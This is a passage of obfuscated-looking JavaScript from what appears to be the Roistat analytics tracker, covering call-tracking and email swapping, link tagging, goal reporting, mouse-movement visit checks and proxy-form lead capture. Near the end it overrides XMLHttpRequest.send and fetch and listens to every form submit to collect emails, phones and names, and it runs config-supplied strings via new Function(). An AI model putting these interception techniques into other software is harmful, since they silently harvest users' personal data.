        e(d9);
      } else {
        e(d9, ec);
      }
    };
    var dU = function () {
      A("CallTracking: request new phone");
      var d8 = j(cl);
      var ec = at();
      var eb = ec ? ec : bG;
      var ea = encodeURIComponent(cJ);
      var d9 = S() + "/get-phone?visit=" + d8 + "&marker=" + (eb ? eb : "") + "&prefix=" + cT + "&prefix_bind=" + dI + "&phone_scripts_bind=" + W + "&page=" + ea;
      a4(d9, Z);
    };
    var dW = function () {
      cT = cv.roistatPhonePrefix ? cv.roistatPhonePrefix : "";
      dI = cv.roistatPhonePrefixBind ? cv.roistatPhonePrefixBind : "";
      W = cv.roistatCalltrackingScripts && cv.roistatCalltrackingScripts.join ? cv.roistatCalltrackingScripts.join(",") : "";
      A("CallTracking: refresh phone with prefix: " + cT + ", binding: " + dI + ", scripts: " + W);
      dU();
    };
    var d7 = function () {
      var d8 = cs.get(o) > 0;
      var d9 = ca.callTrackingEnabled;
      return d8 && d9;
    };
    var dX = function (d8) {
      dS(d8.is_enabled);
    };
    var d4 = function d4() {
      var d8 = d2();
      if (!d6(d8)) {
        A("CallTracking: invalid phone " + d8 + ", requesting a new one");
        dU();
      } else {
        A("CallTracking: render phone " + d8);
        var d9 = ds(d0());
        if (d9 == null) {
          e(d8);
        } else {
          e(d8, d9);
        }
      }
    };
    var d3 = function () {
      A("CallTracking: init");
      if (aQ()) {
        A("CallTracking: Shut down because only online chat need to be inited");
        return;
      }
      d1();
      if (!d7()) {
        A("CallTracking: disabled, skip");
        return;
      }
      if (ca.callTrackingManual) {
        A("CallTracking: init finish because off manual");
        return;
      }
      d4();
      aD(d4);
    };
    cv.roistatCallTrackingRefresh = dW;
    cv.roistatRequestNewPhone = dU;
    cv.roistatReusePhone = dZ;
    cv.roistatCalltrackingUpdateSettings = dX;
    cL(d3);
  })();
  (function G() {
    var dR = function (dX) {
      A("Emailtracking: " + dX);
    };
    var dV = function (dX, dZ, dY) {
      cs.save(bE, dX, c7);
      cs.save(b, dZ, c7);
      cs.save(bT, JSON.stringify(dY), c7);
    };
    var dQ = function () {
      var dX = cv.roistat.emailtracking.email && cv.roistat.emailtracking.trackingEmail || aX(cv.roistat.emailtracking.emails);
      if (cv.roistat.emailtracking.loaded && dX) {
        dR("save loaded email: " + cv.roistat.emailtracking.email);
        dV(cv.roistat.emailtracking.email, cv.roistat.emailtracking.trackingEmail, cv.roistat.emailtracking.emails);
      } else {
        dR("settings save skip, because not loaded");
        cv.roistat.emailtracking.email = cs.get(bE);
        cv.roistat.emailtracking.email = cv.roistat.emailtracking.email ? cv.roistat.emailtracking.email : null;
        cv.roistat.emailtracking.email = cv.roistat.emailtracking.email === "null" ? null : cv.roistat.emailtracking.email;
        dR("email loaded from storage: " + cv.roistat.emailtracking.email);
        cv.roistat.emailtracking.trackingEmail = cs.get(b);
        cv.roistat.emailtracking.trackingEmail = cv.roistat.emailtracking.trackingEmail ? cv.roistat.emailtracking.trackingEmail : null;
        cv.roistat.emailtracking.trackingEmail = cv.roistat.emailtracking.trackingEmail === "null" ? null : cv.roistat.emailtracking.trackingEmail;
        dR("tracking email loaded from storage: " + cv.roistat.emailtracking.trackingEmail);
        cv.roistat.emailtracking.emails = ds(cs.get(bT));
        cv.roistat.emailtracking.emails = cv.roistat.emailtracking.emails ? cv.roistat.emailtracking.emails : null;
        dR("emails loaded from storage: " + JSON.stringify(cv.roistat.emailtracking.emails));
      }
    };
    var dT = function (dX) {
      dV(dX.email, dX.trackingEmail, dX.emails);
    };
    var dS = function () {
      var dX = !!cv.roistat.emailtracking.email && !!cv.roistat.emailtracking.trackingEmail || aX(cv.roistat.emailtracking.emails);
      return cv.roistat.emailtracking.enabled && dX;
    };
    var e = function () {
      if (!dS()) {
        dR("emailtracking disabled, skip swapping");
        return;
      }
      var dY = function (d3, d4, d2) {
        if (d3.href) {
          var d1 = aK(d3.href);
          if (d4.test(d1)) {
            d3.href = d1.replace(d4, d2);
            return true;
          }
        }
        if (d3.nodeType !== 3) {
          return false;
        }
        if (d3.textContent && d4.test(d3.textContent)) {
          d3.textContent = d3.textContent.replace(d4, d2);
          return true;
        } else {
          if (d3.innerText && d4.test(d3.innerText)) {
            d3.innerText = d3.innerText.replace(d4, d2);
            return true;
          }
        }
        return false;
      };
      var dX = function (d1) {
        return d1.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&");
      };
      var dZ = function (d3, d2) {
        var d1 = !d2.match(/[a-z]/);
        return d1 ? d3.toUpperCase() : d3;
      };
      var d0 = function (d9, eb) {
        var ec = dX(d9);
        var d3 = new RegExp("(^|\\s)(mailto:)?(" + ec + ")($|\\s|\\?)", "gi");
        var ed = function (ei, eg, ee, ef, eh) {
          ee = ee || "";
          return eg + ee + dZ(eb, ef) + eh;
        };
        dR("starting to replace email " + d9 + " to " + eb + " with regexp " + d3);
        var d2 = M.getElementsByTagName("*");
        var d5 = d2.length;
        dR("found " + d5 + " nodes on page");
        var d8 = 0;
        for (var d7 = 0; d7 < d5; d7++) {
          var d4 = d2[d7];
          var ea = d4.childNodes.length;
          if (ea > 0) {
            for (var d6 = 0; d6 < ea; d6++) {
              var d1 = d4.childNodes[d6];
              if (dY(d1, d3, ed)) {
                d8++;
              }
            }
          }
          if (dY(d4, d3, ed)) {
            d8++;
          }
        }
        dR("successfully replaced " + d8 + " nodes");
      };
      if (cv.roistat.emailtracking.emails) {
        bv(cv.roistat.emailtracking.emails, d0);
      } else {
        d0(cv.roistat.emailtracking.email, cv.roistat.emailtracking.trackingEmail);
      }
    };
    var dU = function () {
      dR("process email swap");
      e();
      setTimeout(function () {
        e();
      }, 300);
      setTimeout(function () {
        e();
      }, 5000);
      setTimeout(function () {
        e();
      }, 15000);
    };
    var dW = function () {
      dR("init");
      if (aQ()) {
        dR("Shut down because only online chat need to be inited");
        return;
      }
      aD(dU);
      dQ();
      dU();
    };
    cv.roistatEmailtrackingUpdateSettings = dT;
    cv.roistat.emailtracking.refresh = e;
    cL(dW);
  })();
  (function bx() {
    var dS = function (dU) {
      A("MultiDomain: " + dU);
    };
    var dR = function () {
      return cs.get(c9) > 0;
    };
    var dQ = function (dY) {
      var dZ = function (d1) {
        if (!d1) {
          return false;
        }
        if (dj(d1, "roistat_visit")) {
          return false;
        }
        var d0 = bh(d1);
        var d3 = bh(M.domain);
        var d2 = new RegExp(/^((https?:)?\/\/)?([A-ZА-ЯЁ0-9\_\-\~]+\.)+[A-ZА-ЯЁ0-9\_\-\~]+/i);
        return d0 !== d3 && d2.test(d1);
      };
      var dX = function (d3) {
        var d4 = d3.split("#");
        var d2 = d4[0].split("?");
        var d0 = "";
        var d1 = "";
        if (d2.length === 2) {
          d0 = d2[1];
        }
        if (d0) {
          d1 = "&";
        }
        d0 = d0 + d1 + "roistat_visit=" + roistat.getVisit();
        d2[1] = d0;
        d4[0] = d2.join("?");
        return d4.join("#");
      };
      if (dY.tagName.toLowerCase() !== "a") {
        return;
      }
      var dW = dY.getAttribute("href");
      var dV = false;
      if (dZ(dW)) {
        var dU = dX(dW);
        dS("update url " + dW + " > " + dU);
        dY.setAttribute("href", dU);
        dV = true;
      }
      return dV;
    };
    var e = function () {
      if (!dR()) {
        dS("disabled, skip");
        return;
      }
      var dU = M.getElementsByTagName("a");
      var dV = dU.length;
      dS("found " + dV + " <a> nodes on page");
      var dY = 0;
      for (var dW = 0; dW < dV; dW++) {
        var dX = dU[dW];
        if (dQ(dX)) {
          dY++;
        }
      }
      dS("replaced " + dY + " nodes");
    };
    var dT = function () {
      dS("init");
      if (aQ()) {
        dS("Shut down because only online chat need to be inited");
        return;
      }
      e();
      setTimeout(function () {
        e();
      }, 300);
      setTimeout(function () {
        e();
      }, 5000);
      setTimeout(function () {
        e();
      }, 15000);
    };
    cL(dT);
  })();
  (function di() {
    var e = 60 * 1000;
    var dW = 2 * 60 * 1000;
    var dQ = function (dY) {
      A("SettingsUpdater: " + dY);
    };
    var dU = function () {
      cs.set(af, cz());
    };
    var dV = function () {
      var dZ = dp();
      var dY = !(dZ > 0);
      dQ("is first update check: lastUpdateTime=" + dZ + ", result=" + (dY ? 1 : 0));
      return dY;
    };
    var dX = function () {
      var d0 = cz() - dW;
      var dZ = dp();
      var dY = dZ <= d0;
      dQ("expiration check: _minTime=" + d0 + ", lastUpdateTime=" + dZ + ", result=" + (dY ? 1 : 0));
      return dY;
    };
    var dR = function (dZ) {
      var dY = j(cl);
      a(dY, dZ);
    };
    var dS = function (dZ) {
      dQ("update settings and save last update time");
      var dY = cs.getObject(s) !== null;
      if (dY) {
        var d0 = ds(dZ.js_settings.leadHunterTargetPagesMap);
        if (d0 !== null) {
          cs.setObject(s, d0);
        }
      }
      cv.roistatCalltrackingUpdateSettings(dZ.calltracking);
      cv.roistatEmailtrackingUpdateSettings(dZ.emailtracking);
      cv.roistatSaveLeadHunterTemplates(dZ.leadhunter_templates.form_template, dZ.leadhunter_templates.pulsator_template, dZ.leadhunter_templates.pulsator_settings);
      cv.roistatSaveMultiwidgetTemplate(dZ.multiwidget_templates.pulsator_template, dZ.multiwidget.pulsator_settings);
      cv.roistatSaveOnlineChatTemplate(dZ.online_chat_templates.pulsator_template, dZ.online_chat_templates.iframe_template);
      cv.roistatSaveProxyFormSettings(dZ.proxy_forms);
      bl(dZ.js_settings);
      c8(dZ.multiwidget.multiwidget_settings);
      cw(dZ.online_chat);
      w(dZ.geo);
      cH(dZ.promo_code);
      cn.isSettingsUpdating = false;
      dU();
    };
    var dT = function () {
      dQ("init");
      if (dV()) {
        dQ("in first update we just start first timer and skip");
        dU();
        return;
      }
      if (!dX()) {
        dQ("update is not not expired, skip");
        return;
      }
      dQ("start to update settings");
      dR();
    };
    cL(function () {
      cv.roistatUpdateSettings = dS;
      setTimeout(function () {
        dT();
      }, 3000);
      dQ("set interval to update settings");
      setInterval(function () {
        dT();
      }, e);
    });
  })();
  (function b2(dT, e, dV) {
    var dS = {};
    var dQ = function (dX) {
      var dW = encodeURIComponent ? encodeURIComponent : encodeURI;
      return dW(dX);
    };
    var dR = function (d3, dX) {
      A("Reach goal start");
      if (!d3) {
        d3 = {};
      }
      var d0 = {
        leadName: "",
        formTitle: "",
        name: "",
        phone: "",
        email: "",
        price: "",
        text: "",
        fields: "",
        client_fields: "",
        is_need_callback: "",
        callback_phone: "",
        visit: cM(),
        is_skip_sending: 0,
        items: "",
        placeholders_data: "",
        engine_type: ""
      };
      for (var dZ in d0) {
        if (!Object.prototype.hasOwnProperty.call(d0, dZ)) {
          continue;
        }
        if (!Object.prototype.hasOwnProperty.call(d3, dZ)) {
          continue;
        }
        if (!d3[dZ]) {
          continue;
        }
        if (dZ === "fields" || dZ === "client_fields" || dZ === "items" || dZ === "placeholders_data") {
          d3[dZ] = JSON.stringify(d3[dZ]);
        }
        d0[dZ] = dQ(d3[dZ]);
      }
      var d2 = bd();
      var d1 = bi() + "//" + x + "/api/site/" + ao + "/" + d2 + "/reach-goal?v=2";
      for (var dY in d0) {
        if (!Object.prototype.hasOwnProperty.call(d0, dY)) {
          continue;
        }
        d1 = d1 + "&" + dY + "=" + d0[dY];
      }
      if (dX !== dV) {
        var dW = Math.random().toString();
        dS[dW] = dX;
        d1 += "&callback_key=" + dW;
      }
      a4(d1);
      A("Reach goal completed");
    };
    var dU = dT.roistatGoal = {
      reach: function (dX, dW) {
        dR(dX, dW);
      },
      callAfterReachCallback: function (dW) {
        if (Object.prototype.hasOwnProperty.call(dS, dW)) {
          dS[dW]();
          delete dS[dW];
        }
      }
    };
  })(cv, M, bO);
  (function dC(dR, e, dS) {
    var dQ = function (dX) {
      if (dX instanceof Array || dX === null || typeof dX !== "object") {
        A("Invalid event data");
        return "";
      }
      var dU = [];
      for (var dW in dX) {
        if (Object.prototype.hasOwnProperty.call(dX, dW)) {
          var dV = dX[dW];
          if (typeof dV === "string" || typeof dV === "number") {
            dU.push("data[" + encodeURIComponent(dW) + "]=" + encodeURIComponent(dV));
          } else {
            A("Event data property ignored: " + dW);
          }
        }
      }
      return dU.length > 0 ? "&" + dU.join("&") : "";
    };
    var dT = function (dW, dX) {
      A("Send event start");
      var dU = p();
      I("Name: " + dW + " Data: " + dQ(dX) + " VisitId: " + dU);
      var dV = S() + "/event/register?visit=" + dU + "&event=" + dW + dQ(dX);
      a4(dV);
      A("Send event completed");
    };
    dR.roistat.event = {
      send: function (dU, dV) {
        dT(dU, dV);
      }
    };
  })(cv, M, bO);
  (function ct(dZ, d1, dS) {
    if (aQ()) {
      A("VisitApprove: Shut down because only online chat need to be inited");
      return;
    }
    var d2 = dZ.roistatIsInitVisit === true ? 20000 : 10000;
    var dR = new Date().getTime();
    var dQ = function (d6) {
      return "approve_visit_" + d6;
    };
    var dY = function (d6) {
      ci.set(dQ(d6), 1);
    };
    var d3 = function (d6) {
      return ci.get(dQ(d6)) > 0;
    };
    var e,
      dU,
      d5 = [];
    if (d1.addEventListener) {
      e = function (d7, d6, d8) {
        return d7.addEventListener(d6, d8, false);
      };
      dU = function (d7, d6, d8) {
        return d7.removeEventListener(d6, d8, false);
      };
    } else {
      e = function (d7, d6, d8) {
        return d7.attachEvent("on" + d6, d8);
      };
      dU = function (d7, d6, d8) {
        return d7.detachEvent("on" + d6, d8);
      };
    }
    var dX = function (d9) {
      if (d5.length > 30) {
        return;
      }
      d9 = d9 || dZ.event;
      if (!d9 || !d9.screenX) {
        return;
      }
      var d8 = new Date().getTime();
      var eb,
        ea = null;
      if (d5.length > 0) {
        ea = d5[d5.length - 1];
      }
      if (ea) {
        eb = d8 - ea.time;
      } else {
        eb = d8 - dR;
      }
      if (eb < 300) {
        return;
      }
      eb = eb - 300;
      var ed = 0;
      var d6 = d9.screenX;
      var ec = d9.screenY;
      if (ea) {
        ed = parseInt(Math.sqrt(Math.pow(ea.y - ec, 2) + Math.pow(ea.x - d6, 2)));
      }
      var d7 = {
        time: d8,
        pauseBeforeMove: eb,
        x: d6,
        y: ec,
        distance: ed
      };
      d5.push(d7);
    };
    var dW = function () {
      var d6 = [];
      r(d5, function (d7) {
        var d8 = [d7.pauseBeforeMove, d7.distance];
        d6.push(d8.join(":"));
      });
      if (d6.length === 0) {
        d6.push("0:0");
      }
      return d6.join("|");
    };
    var dT = function () {
      for (var d6 in dZ) {
        if (dj(d6, "yaCounter")) {
          return true;
        }
      }
      return false;
    };
    var d0 = function () {
      dU(d1, "mousemove", dX);
      var d6 = p();
      A("VisitApprove: start for visit " + d6);
      if (d3(d6)) {
        A("VisitApprove: visit already approved, skip");
        return;
      }
      dY(d6);
      aG();
      var d7 = S() + "/approve?v=" + ab + "&visit=" + d6;
      if (d4()) {
        d7 += "&hash=" + ay();
      }
      if (dV()) {
        d7 += "&page_params=" + encodeURIComponent(JSON.stringify(dZ.roistat.page.params));
        g();
      }
      d7 += "&mv=" + dW();
      d7 += "&pl=" + (dZ.navigator ? dZ.navigator.platform : "");
      d7 += "&ym=" + (dT() ? "1" : "0");
      d7 += "&wd=" + (dZ.navigator ? dZ.navigator.webdriver === true ? "1" : "0" : "0");
      a4(d7);
    };
    var d4 = function () {
      var ea = cn.cookies,
        d9 = n();
      var ec = bo();
      for (var d7 = 0; d7 < ec.length; d7++) {
        var eb = ec[d7];
        var ed = Object.prototype.hasOwnProperty.call(ea, eb) ? ea[eb] : dS;
        var d6 = Object.prototype.hasOwnProperty.call(d9, eb) ? d9[eb] : dS;
        var d8 = typeof d6 === "string" && d6.length > 0;
        if (d8 && ed !== d6) {
          return true;
        }
      }
      return false;
    };
    var dV = function () {
      var eb = cn.pageParams,
        d8 = dZ.roistat.page.params;
      for (var d7 = 0; d7 < cU.length; d7++) {
        var d6 = cU[d7];
        var d9 = Object.prototype.hasOwnProperty.call(eb, d6) ? eb[d6] : null;
        var ea = Object.prototype.hasOwnProperty.call(d8, d6) ? d8[d6] : null;
        if (ea !== d9) {
          return true;
        }
      }
      return false;
    };
    setTimeout(function () {
      d0();
    }, d2);
    e(d1, "mousemove", dX);
  })(cv, M, bO);
  (function aE(dV, dW, dR) {
    var dT = function () {
      return ae("roistat_ab_demo") === "1";
    };
    var dX = function (d0) {
      return new RegExp(d0.split(".").join("\\.").split("*").join(".*").split("?").join("."));
    };
    var dU = function (d5) {
      var d0 = dV.location.href,
        d3 = d5.filter,
        d9 = d5.filterValue;
      var d6;
      switch (d3) {
        case "except":
        case "pages":
          var d1,
            d8,
            d7 = false;
          d8 = d0 ? aS(d0) : "";
          d6 = d9 ? d9.split("\n") : [];
          if (d8 && d6.length !== 0) {
            for (var d2 = 0; d2 < d6.length; d2++) {
              var d4 = d6[d2].trim();
              if (d4.length === 0) {
                continue;
              }
              d1 = dX(d4);
              if (d1.test(d8)) {
                d7 = true;
                break;
              }
            }
          }
          return d3 === "pages" ? d7 : !d7;
          break;
        case "all":
        default:
          return true;
      }
    };
    var dQ = function (d2) {
      var d0 = dW.getElementsByTagName("head")[0],
        d1;
      d1 = dW.createElement("style");
      d1.setAttribute("type", "text/css");
      if (d1.styleSheet) {
        d1.styleSheet.cssText = d2.value;
      } else {
        d1.innerText = d2.value;
      }
      d0.appendChild(d1);
      A("Applied css-test: " + d2.id);
    };
    var e = function (d0) {
      if (Object.prototype.hasOwnProperty.call(c6.onAbTestsApplied, d0.id)) {
        c6.onAbTestsApplied[d0.id](d0.value);
      }
      A("Applied uniform-test: " + d0.id);
    };
    var dS = function (d0) {
      if (dU(d0)) {
        switch (d0.type) {
          case "css":
            dQ(d0);
            break;
          case "uniform":
            e(d0);
            break;
        }
      }
    };
    dV.applyTests = function () {
      A("Start applying ab tests");
      var d0 = cs.getObject("abTesting");
      var d2, d1;
      for (d2 in d0) {
        if (!Object.prototype.hasOwnProperty.call(d0, d2)) {
          continue;
        }
        d1 = d0[d2];
        dS(d1);
      }
      cn.isAbTestsApplied = true;
      A("End applying ab tests");
      if (dV.onRoistatAbTestsApplied !== dR && typeof dV.onRoistatAbTestsApplied === "function") {
        dV.onRoistatAbTestsApplied();
      }
    };
    var dY = function () {
      A("Call: apply demo AB test");
      var d0 = ae("roistat_ab_data");
      var d1;
      if (d0 === null) {
        return;
      } else {
        d1 = JSON.parse(cy.decode(d0));
      }
      if (typeof d1 !== "object") {
        A("Error: testValue is not an object.");
        return;
      }
      dS(d1);
    };
    function dZ() {
      if (aQ()) {
        A("ABTest: Shut down because only online chat need to be inited");
        return;
      }
      var d0 = dT();
      if (!de && !d0) {
        applyTests();
      }
      if (d0) {
        dY();
      }
    }
    dZ();
  })(cv, M, bO);
  (function cR(dQ, e, dR) {
    if (aQ()) {
      A("visitStream: Shut down because only online chat need to be inited");
      return;
    }
    if (!dh) {
      return;
    }
    setTimeout(function () {
      (function (dY, dX, d1, d0, dV, dT, dW) {
        dY[dV] = {
          COUNTER_ID: dT,
          HOST: dW
        };
        var dU = dX.location.protocol == "https:" ? "https://" : "http://";
        var dS = dX.createElement(d1);
        dS.async = 1;
        dS.src = dU + dW + d0;
        var dZ = dX.getElementsByTagName(d1)[0];
        dZ.parentNode.insertBefore(dS, dZ);
      })(dQ, e, "script", "/counter.js", "datamap", bd(), dh);
    }, 1000);
  })(cv, M, bO);
  (function cq(dR, e, dS) {
    var dT = function () {
      var dU = dR.roistatMetrikaCounterId;
      if (dU) {
        cs.set(a6, dU);
      }
    };
    var dQ = function (dZ) {
      var dU = "yaCounter" + dZ;
      var dY = 100,
        dW = 0,
        dX = 60000;
      var dV = function () {
        dW += dY;
        A("YandexMetrika: trying to access counter " + dZ);
        if (dR[dU] === dS) {
          if (dW < dX) {
            setTimeout(dV, dY);
            dY *= 2;
          }
          return;
        }
        var d0 = {};
        d0[c4] = p();
        dR[dU].params(d0);
        A("YandexMetrika: visit id " + d0[c4] + " sent to counter " + dZ);
      };
      setTimeout(dV, dY);
    };
    cL(function () {
      dT();
      var dW = cs.get(a6);
      if (!dW) {
        A("YandexMetrika: counter id not found");
        return;
      }
      var dV = String(dW).split(",");
      A("YandexMetrika: counters: " + dV);
      for (var dU = 0; dU < dV.length; dU++) {
        if (dV[dU].trim() === "") {
          continue;
        }
        dQ(dV[dU]);
      }
    });
  })(cv, M, bO);
  (function az(dZ, d3) {
    var d7 = function (ea) {
      A("Proxy Forms: " + ea);
    };
    var dW = function () {
      if (dZ.roistat.proxyForms.loaded && dZ.roistat.proxyForms.settings.length > 0) {
        d7("save loaded settings");
        d4(dZ.roistat.proxyForms.settings);
      } else {
        d7("settings not loaded, getting from storage");
        dZ.roistat.proxyForms.settings = cs.getObject(dB) || [];
      }
    };
    var d4 = function (ea) {
      cs.setObject(dB, ea);
    };
    var d0 = function () {
      d7("init form listener");
      dS(dZ.roistat.proxyForms.settings);
      e(dZ.roistat.proxyForms.settings);
    };
    var d9 = function (ea) {
      return ea.hasOwnProperty("hosts") && ea.hasOwnProperty("is_excluding_hosts") && bC(ea.hosts) && ea.hosts.length > 0;
    };
    var dU = function (eb) {
      if (!d9(eb)) {
        return true;
      }
      var ec = dq(eb.hosts, bh(dZ.location.host));
      var ea = Boolean(eb.is_excluding_hosts);
      return ea ? !ec : ec;
    };
    var dR = function (eb) {
      var ea = [];
      r(eb, function (ec) {
        if (dU(ec)) {
          ea.push(ec);
        }
      });
      return ea;
    };
    var e = function (ea) {
      var ec = [];
      r(ea, function (ed) {
        if (ed.type === "js-button") {
          ec.push(ed);
        }
      });
      if (ec.length < 1) {
        d7("no button settings");
        return;
      }
      var eb;
      if (d3.addEventListener) {
        eb = function (ed) {
          dV(ec, ed, ed.target, dT);
        };
        d3.addEventListener("click", eb, true);
      } else {
        if (d3.attachEvent) {
          eb = function () {
            var ed = dZ.event;
            dV(ec, ed, ed.srcElement, dT, true);
          };
          d3.attachEvent("onclick", eb);
        } else {
          d7("Listener could not be attached");
        }
      }
    };
    var dS = function (eb) {
      I("Proxy form debug: start");
      var ea = [];
      r(eb, function (ed) {
        if (ed.type === "form") {
          ea.push(ed);
        }
      });
      if (ea.length < 1) {
        d7("no form settings");
        return;
      }
      if (d3.addEventListener) {
        var ec = function (ed) {
          dV(ea, ed, ed.target, d8);
        };
        d3.addEventListener("submit", ec, true);
      } else {
        if (d3.attachEvent) {
          setInterval(function () {
            ea = dR(ea);
            var ed = d3.getElementsByTagName("form");
            r(ed, function (ee) {
              if (ee.getAttribute("data-roistat-proxy-form-checked") === "true") {
                return;
              }
              ee.setAttribute("data-roistat-proxy-form-checked", "true");
              r(ea, function (ef) {
                if (dQ(ee, ef.selector)) {
                  ee.attachEvent("onsubmit", function () {
                    dZ.event.returnValue = false;
                    I("Proxy form debug: start sending form lead");
                    d8(ef, dZ.event.srcElement);
                  });
                }
              });
            });
          }, 2000);
        } else {
          d7("Listener could not be attached");
        }
      }
    };
    var dV = function (ed, ee, ef, ec, ea) {
      var eg = dR(ed);
      var eb = null;
      r(eg, function (eh) {
        if (dQ(ef, eh.selector)) {
          eb = eh;
        }
      });
      if (eb === null) {
        d7("No matched settings found for listener");
        return;
      }
      ec(ee, eb, ef, ea);
    };
    var d8 = function (ee, ec, ed, eb) {
      var ea = d2(ed, ec);
      if (!d5(ea, ec)) {
        I("Proxy form debug: lead fields is not valid");
        return;
      }
      eb ? ee.returnValue = false : ee.preventDefault();
      I("Proxy form debug: sending lead");
      dX(ea, ec, function () {
        HTMLFormElement.prototype.submit.call(ed);
      });
    };
    var dT = function (ec, eb) {
      var ea = d2(null, eb);
      if (!d5(ea, eb)) {
        return;
      }
      dX(ea, eb);
    };
    var dX = function (ea, ed, ef) {
      var ee = {};
      var ec = dY(ed.crm) && ed.crm.hasOwnProperty("is_enabled");
      var eb = ec ? ed.crm.is_enabled : true;
      ee.leadName = ed.hasOwnProperty("lead_name") ? ed.lead_name : "Новый лид с формы " + ed.title;
      ee.formTitle = ed.title;
      ee.name = ea.name;
      ee.phone = ea.phone;
      ee.email = ea.email;
      ee.text = ea.comment;
      ee.fields = ea.fields;
      ee.placeholders_data = ea.placeholdersData;
      ee.is_need_callback = ed.is_need_callback > 0 ? 1 : 0;
      ee.is_skip_sending = !eb;
      dZ.roistatGoal.reach(ee, ef);
    };
    var dY = function (ea) {
      return typeof ea === "number" && !isNaN(ea) || typeof ea === "string" && ea !== "" || typeof ea === "object" && ea !== null || typeof ea === "boolean" && ea || bC(ea);
    };
    var d5 = function (ea, ec) {
      var eb = [],
        ee = ["name", "email", "phone", "comment"];
      r(ee, function (ef) {
        if (ec.hasOwnProperty(ef) && ec[ef].required > 0) {
          eb.push(ef);
        }
      });
      if (bC(ec.fields)) {
        r(ec.fields, function (ef) {
          if (ef.required > 0) {
            eb.push(ef);
          }
        });
      }
      var ed = true;
      r(eb, function (ef) {
        if (!ea.hasOwnProperty(ef) || !dY(ea[ef])) {
          ed = false;
        }
      });
      return ed;
    };
    var d2 = function (ec, eb) {
      var ea = {};
      ea.name = eb.name ? d1(ec, eb.name.value, eb.name.type) : "";
      ea.phone = eb.phone ? d1(ec, eb.phone.value, eb.phone.type) : "";
      ea.email = eb.email ? d1(ec, eb.email.value, eb.email.type) : "";
      ea.comment = eb.comment ? d1(ec, eb.comment.value, eb.comment.type) : "";
      ea.fields = {};
      ea.placeholdersData = {
        orderPage: cJ
      };
      if (bC(eb.fields)) {
        r(eb.fields, function (ed) {
          ea.fields[ed.name] = d1(ec, ed.value, ed.type);
        });
      }
      return ea;
    };
    var d1 = function (eb, ee, ea) {
      switch (ea) {
        case "plain":
          return ee || "";
        case "input":
          var ed = eb.querySelector('input[name="' + ee + '"]');
          return ed ? ed.value : "";
        case "js":
          try {
            return new Function(ee)();
          } catch (ec) {
            return "";
          }
      }
    };
    var d6 = function () {
      d7("init");
      if (aQ()) {
        d7("Shut down because only online chat need to be inited");
        return;
      }
      if (!dZ.roistat.proxyForms.enabled) {
        d7("disabled");
        return;
      }
      dW();
      d0();
    };
    var dQ = function (ed, eb) {
      if (typeof Element !== "undefined" && Element.prototype.matches) {
        var ea = ed.matches(eb);
        if (!ea) {
          return ed.closest(eb) ? ed.closest(eb).matches(eb) : false;
        }
        return ea;
      } else {
        if (typeof Element !== "undefined" && Element.prototype.matchesSelector) {
          var ee = ed.matchesSelector(eb);
          if (!ee) {
            return ed.closest(eb) ? ed.closest(eb).matches(eb) : false;
          }
          return ee;
        } else {
          if (d3.querySelectorAll) {
            var ef = d3.querySelectorAll(eb);
            for (var ec = 0; ec < ef.length; ec++) {
              if (ef[ec] === ed) {
                return true;
              }
            }
            return false;
          }
        }
      }
      return false;
    };
    cL(d6);
    dZ.roistatSaveProxyFormSettings = d4;
  })(cv, M);
  (function R() {
    if (cv.onRoistatAllModulesLoaded !== bO && typeof cv.onRoistatAllModulesLoaded === "function") {
      A("onRoistatAllModulesLoaded: call");
      cv.onRoistatAllModulesLoaded();
    }
  })();
  (function be(dW, dZ, dT) {
    var e = function () {
      return cs.get(au) * 1 > 0;
    };
    var dY = function (d5) {
      A("Request listener: " + d5);
    };
    var d4 = /^(8|7|380|45|370|375|1|48|357|44|373|371|49|971|996|995|972|420|33|90|34|55|61|52|60|374|43|41|351)?(\d){9,13}$/g;
    var dX = /^[^\s]+[@][^\s]+$/g;
    var dS = ["mc.yandex.ru", "google-analytics.com", "google.ru", "google.com", "stats.g.doubleclick.net"];
    var dR = function dR() {
      dY("listen");
      if (dW.XMLHttpRequest) {
        XMLHttpRequest.prototype.oldSend = XMLHttpRequest.prototype.send;
        function d7(ea) {
          var d9 = this;
          d0(d9.responseURL, ea, function () {
            d9.oldSend(ea);
          });
        }
        XMLHttpRequest.prototype.send = d7;
      }
      if (dW.ActiveXObject) {
        var d6 = d8;
        function d8(eb) {
          var d9 = new d6(eb);
          var ec = {};
          if (eb.toLowerCase() === "msxml2.xmlhttp") {
            ec = {
              _ax: d9,
              _status: "fake",
              responseText: "",
              responseXml: null,
              readyState: 0,
              status: 0,
              statusText: 0,
              onReadyStateChange: null
            };
            var ea = "";
            ec._onReadyStateChange = function () {
              var ed = ec;
              return function () {
                ed.readyState = ed._ax.readyState;
                if (ed.readyState === 4) {
                  ed.responseText = ed._ax.responseText;
                  ed.responseXml = ed._ax.responseXml;
                  ed.status = ed._ax.status;
                  ed.statusText = ed._ax.statusText;
                }
                if (ed.onReadyStateChange) {
                  ed.onReadyStateChange();
                }
              };
            }();
            ec.open = function (eh, ef, eg, ed, ee) {
              ea = ef;
              eg = eg !== false;
              this._ax.onReadyStateChange = this._onReadyStateChange;
              return this._ax.open(eh, ef, eg, ed, ee);
            };
            ec.send = function (ed) {
              var ee = this;
              d0(ea, ed, function () {
                this._ax.send(ed);
              });
            };
          } else {
            ec = d9;
          }
          return ec;
        }
        dW.ActiveXObject = d8;
      }
      if (dW.fetch) {
        var d5 = fetch;
        fetch = function (d9, ea) {
          d0(d9.url, ea || {});
          return d5(d9, ea || {});
        };
      }
      dW.addEventListener("submit", function (ec) {
        var ee = ec.target.elements;
        var ed = {};
        for (var eb = 0; eb < ee.length; eb++) {
          var ea = ee[eb];
          var d9 = ea.getAttribute("name");
          ed[d9] = ea.value;
        }
        d0("", ed);
      });
    };
    function dU(d5) {
      var d8 = {};
      if (d5.length === 0) {
        return d8;
      }
      var d7 = d5.split("?");
      if (d7.length < 2) {
        return d8;
      }
      var d6 = d7[1];
      d8 = dQ(d6);
      return d8;
    }
    function dQ(d6) {
      var d7 = d6.split("&"),
        d9 = {};
      for (var d5 = 0; d5 < d7.length; d5++) {
        var d8 = d7[d5].split("=");
        if (d8.length < 2) {
          continue;
        }
        d9[d8[0]] = d8[1];
      }
      return d9;
    }
    function d2(em) {
      dY("data: " + JSON.stringify(em));
      var ef = {
        email: ["email", "Email", "EMAIL", "mail", "MAIL", "Mail"],
        phone: ["phone", "Phone", "PHONE", "tel", "Tel", "TEL"],
        name: ["name", "Name", "NAME", "full_name", "Full_Name", "FULL_NAME"]
